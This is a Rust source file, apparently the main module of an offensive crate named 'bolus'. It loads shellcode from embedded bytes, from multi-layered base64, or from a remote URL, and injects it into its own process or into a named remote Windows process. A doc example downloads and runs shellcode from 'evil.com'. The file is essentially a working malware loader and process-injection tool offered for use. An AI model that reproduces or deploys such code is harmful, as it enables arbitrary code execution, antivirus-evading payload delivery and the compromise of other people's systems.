pub mod injectors;
use injectors::{
    Injector,
    InjectionType::{
        self,
        Reflect,
        Remote
    },
    InjectorType::{
        self, 
        Embedded, 
        Base64Embedded, 
        Url, 
        Base64Url
    },
    download_shellcode,
    decode_b64_shellcode,
    remote_inject,
    reflective_inject,
};



///
/// Creates an [Injector] to store our shellcode at runtime.
/// 
/// ```
/// use bolus::{
///     load,
///     inject,
///     injectors::{
///         InjectionType,
///         Injector,
///         InjectorType
///     }
/// };
/// let injection_type = InjectionType::Reflect;
/// let injector_type = InjectorType::Url("https://evil.com/shellcode".to_string());
/// let injector: Injector = load(injector_type).unwrap();
/// inject(injector, injection_type, false).unwrap();
/// ```
/// 
pub fn load(injector_type: InjectorType) -> Result<Injector, String> {
    match injector_type {
        Embedded(shellcode) =>  Ok(Injector { shellcode }),
        Base64Embedded((sc_string, b64_iterations)) => {
            let sc_bytes = sc_string.as_bytes().to_vec();
            if let Ok(shellcode) = decode_b64_shellcode(&sc_bytes, b64_iterations) {
                return Ok(Injector { shellcode });
            }
            return Err("Could not decode shellcode!".to_string());
        },
        Url(url) => {
            match download_shellcode(&url) {
                Ok(shellcode) => Ok(Injector { shellcode }),
                Err(e) => Err(e)
            }
        },
        Base64Url((url, b64_iterations)) => {
            if let Ok(b64_shellcode) = download_shellcode(&url) {
                return match decode_b64_shellcode(&b64_shellcode, b64_iterations) {
                    Ok(shellcode) => Ok(Injector { shellcode }),
                    Err(e) => Err(e)
                }
            }
            Err("Could not download encoded shellcode!".to_string())
        }
    }
}

///
/// Performs the shellcode injection. Strategy is determined by
/// `injection_type`. `wait` determines whether 
/// [windows::Windows::Win32::System::Threading::WaitForSingleObject()] 
/// will be used. Useful if the app does not have an infinite main loop.
/// 
pub fn inject(injector: Injector, injection_type: InjectionType, wait: bool) -> Result<(), String> {
    return match injection_type {
        Reflect => unsafe { reflective_inject(&injector.shellcode, wait) },
        Remote(proc_name) => unsafe { remote_inject(&injector.shellcode, wait, &proc_name) } 
    }
} 